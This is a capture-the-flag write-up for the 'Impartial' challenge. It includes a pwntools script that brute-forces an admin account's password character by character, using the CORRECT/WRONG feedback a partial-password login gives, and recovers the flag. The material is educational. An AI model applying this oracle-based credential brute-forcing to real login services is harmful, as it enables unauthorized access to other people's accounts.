# Impartial

Author: [Gallifrey](https://github.com/gallifrey)


# Challenge

```
Check out the terminal-interface for this new company! Can you uncover any secrets?

Connect with:
nc jh2i.com 50026
```

# Solution

At first I tried bruteforcing the username, and wasted a lot of time on it.
The username changed every time, and I was stuck there for too long.
Then I found the 'admin' username, and figured it was the way to go.

Everytime I logged in as admin, it asked me to enter three random letters of the password...

```
Impartial Advice and Consulting
    . . . we will help you put the pieces together!

1. About
2. Login
3. Register
4. Contact
?. Exit

> 2
 
Please enter a username to log in.

Username: admin
 
For your security, please only enter a partial password.
To protect your account from hackers, enter only the characters
at position 25, 21, and 10 (separated by spaces).

Password:
```
... and told if each letter was correct or not:

```
Password: a a a
 25 character: WRONG
21 character: WRONG
10 character: WRONG

```
Using this to bruteforce the entire password:

```python
import re
from pwn import remote

r = remote("jh2i.com", 50026)

data = ''
nop = list() #---> For all the places a character ISN'T present
al = list(i for i in range(1,37))
flag = list('?' for i in range(40))

#list of all allowed chars
alfa_num = list(chr(x) for x in range(ord('a'),ord('z')+1))
alfa_num.extend(list(chr(x) for x in range(ord('A'),ord('Z')+1)))
alfa_num.extend(list(chr(x) for x in range(ord('0'),ord('1')+1)))
alfa_num.extend(['{','}','_'])

data = r.recvuntil(">").decode()
print(data,end=" ")

for l in alfa_num:
	f = open('a.txt','a') #--> To write down my findings in a file (like a sace progress), cause earlier version of this script kept throwing errors in the middle of a long run
	for i in range(40):
		r.sendline(b"2")
		print("2")
		data = r.recvuntil("Username:").decode()
		print(data,end=" ")
		r.sendline(b"admin")
		print("admin")
		data = r.recvuntil("Password:").decode()
		print(data,end=" ")
		s = "%s %s %s"%(l,l,l)
		print(s)
		r.sendline(s.encode())
		data = r.recvuntil(">").decode()
		print(data,end=" ")
		if '1.Judge' in data:
			r.sendline(b'3')
			continue
		for k in data.split('\n'):
			if 'CORRECT' in k:
				flag[list(int(i) for i in k.split() if i.isdigit())[0]] = l
				print(list(int(i) for i in k.split() if i.isdigit())[0])
			if 'WRONG' in k: 
				nop.extend(list(i for i in data.split() if i.isdigit()))
		print(''.join(flag))
	nop = list(set(nop))
	nop = list(int(a) for a in nop)
	nop = list(filter(lambda x: x not in nop,al))
	to_pr = l + '=' + str(nop)
	f.write(to_pr)
	f.close()

```

The script took some time to run, but I finally got a partial flag

```

```

Then, guessing the flag wasn't hard

```
flag{partial_password_puzzle_pieces}
```
